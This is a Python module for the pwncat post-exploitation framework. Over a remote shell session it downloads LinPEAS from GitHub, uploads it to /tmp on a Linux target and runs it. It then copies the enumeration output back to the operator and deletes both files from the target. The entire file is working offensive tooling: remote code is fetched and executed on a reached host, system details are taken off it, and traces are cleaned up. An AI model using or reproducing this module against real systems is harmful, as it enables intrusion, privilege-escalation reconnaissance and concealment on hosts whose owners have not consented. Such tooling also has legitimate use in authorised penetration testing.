#!/usr/bin/env python3
import requests

import pwncat
from pwncat import util
from pwncat.modules import Status, BaseModule, ModuleFailed, Argument
from pwncat.manager import Session
from pwncat.platform.linux import Linux


class Module(BaseModule):
    """
    Run LinPEAS on the remote host, and save the output locally.
    """

    PLATFORM = [Linux]
    ARGUMENTS = {
        "output": Argument(
            str,
            default="linpeas-{username}.txt",
            help="Local output filename",
        )
    }

    def run(self, session: pwncat.manager.Session, output: str):
        username = session.current_user().name
        filename = output.format(username=username)
        remote_script = f"/tmp/linpeas.sh"
        remote_output = f"/tmp/{filename}"

        session.log(f"Running LinPEAS as [cyan]{username}[/cyan]")

        yield Status("Downloading latest [red]linpeas.sh[/red] release from GitHub...")
        linpeas_content = requests.get("https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh").content

        yield Status(f"Uploading [red]{remote_script}[/red]...")
        with session.platform.open(f"{remote_script}", "wb") as f:
            f.write(linpeas_content)

        yield Status(f"Setting executable permissions on [red]{remote_script}[/red]...")
        session.platform.run(f"chmod +x {remote_script}")

        yield Status(f"Running [red]{remote_script}[/red]... (this may take a while)")
        session.platform.run(f"{remote_script} > {remote_output}")

        yield Status(f"Downloading [red]{remote_output}[/red]...")
        with session.platform.open(f"{remote_output}", "rb") as f:
            data = f.read()

        yield Status(f"Saving [red]{filename}[/red]...")
        with open(filename, "wb") as f:
            f.write(data)

        yield Status(f"Cleaning up [red]{remote_script}[/red] and [red]{remote_output}[/red]...")
        session.platform.run(f"rm {remote_script} {remote_output}")

        session.log(f"Done. Saved output locally to [blue]./{filename}[/blue]")
